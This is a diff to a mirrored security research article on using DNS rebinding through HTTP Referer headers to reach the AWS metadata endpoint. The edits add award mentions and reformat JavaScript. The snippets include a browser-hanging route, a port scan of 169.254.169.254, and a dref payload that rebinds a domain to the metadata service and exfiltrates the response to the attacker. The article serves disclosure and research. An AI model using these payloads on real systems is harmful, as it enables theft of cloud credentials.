@@ -16,6 +16,8 @@ This article describes the use of HTTP Referer headers to execute DNS rebinding 
 
 I originally published this on the [MWR Labs blog](https://labs.mwrinfosecurity.com/blog/from-http-referer-to-aws-security-credentials/). It is reproduced here as a mirror.
 
+This research got nominated (not by me!) for PortSwigger's [top 10 web hacking techniques of 2018](https://portswigger.net/research/top-10-web-hacking-techniques-of-2018-nominations-open) and received a shoutout from [James Kettle on Twitter](https://twitter.com/albinowax/status/1036592199155310593/retweets/with_comments) and a [mention in the following year's 3rd best web hacking technique](https://portswigger.net/research/top-10-web-hacking-techniques-of-2019).
+
 ## Introduction
 
 While DNS rebinding was first described nearly two decades ago, it has recently gained a second youth with the proliferation of insecure IoT devices and a series of highly publicized vulnerabilities. The release of a couple of frameworks, such as MWR's _[dref](https://github.com/mwrlabs/dref)_ or Brannon Dorsey's [DNS Rebind Toolkit](https://github.com/brannondorsey/dns-rebind-toolkit), has also lowered the barrier to entry to conducting this somewhat convoluted attack.
@@ -54,11 +56,14 @@ The ability to cause a browser to hang was added as a configuration key to _dref
 
 ```javascript
 // fetch an image that will never fully load
-router.get('/hang.png', function (req, res, next) {
-  res.status(200).set({
-    'Content-Length': '1'
-  }).send()
-})
+router.get("/hang.png", function (req, res, next) {
+  res
+    .status(200)
+    .set({
+      "Content-Length": "1",
+    })
+    .send();
+});
 ```
 
 With these measures in place, an attacker would have up to four minutes of JavaScript code execution in the browsers.
@@ -72,19 +77,19 @@ However, as the headless browsers that connected to the attacker-controlled site
 The following _dref_ payload was written to verify the service was accessible from the browser:
 
 ```javascript
-import NetMap from 'netmap.js'
-import Session from '../libs/session'
+import NetMap from "netmap.js";
+import Session from "../libs/session";
 
-const session = new Session()
-const netmap = new NetMap()
+const session = new Session();
+const netmap = new NetMap();
 
-function main () {
-  netmap.tcpScan(['169.254.169.254'], [80, 1234, 4444]).then(results => {
-    session.log(results)
-  })
+function main() {
+  netmap.tcpScan(["169.254.169.254"], [80, 1234, 4444]).then((results) => {
+    session.log(results);
+  });
 }
 
-main()
+main();
 ```
 
 If the results of this payload showed port 80 to be open, it could be inferred that the AWS metadata endpoint was accessible to the browser. Ports 1234 and 4444 were also scanned to provide reference points and eliminate a false positive, as these would be expected to be closed.
@@ -118,27 +123,27 @@ Most DNS rebinding frameworks load the rebinding attacks in iFrames, which is al
 _dref_'s flexibility allows the payloads to be written in order to conduct the entire attack in the same frame. The following payload takes a single HTTP Path argument and exfiltrates the response from the endpoint back to the attacker:
 
 ```javascript
-import * as network from '../libs/network'
-import Session from '../libs/session'
+import * as network from "../libs/network";
+import Session from "../libs/session";
 
-const session = new Session()
+const session = new Session();
 
-async function main () {
+async function main() {
   // configure the A record to point to the AWS metadata endpoint when triggered
-  network.postJSON(session.baseURL + '/arecords', {
-    domain: window.env.target + '.' + window.env.domain,
-    address: '169.254.169.254'
-  })
+  network.postJSON(session.baseURL + "/arecords", {
+    domain: window.env.target + "." + window.env.domain,
+    address: "169.254.169.254",
+  });
 
   session.triggerRebind().then(() => {
     // exfiltrate the response from the provided args.path argument
     network.get(session.baseURL + window.args.path, (code, headers, body) => {
-      session.log({code: code, headers: headers, body: body})
-    })
-  })
+      session.log({ code: code, headers: headers, body: body });
+    });
+  });
 }
 
-main()
+main();
 ```
 
 ## AWS Compromise
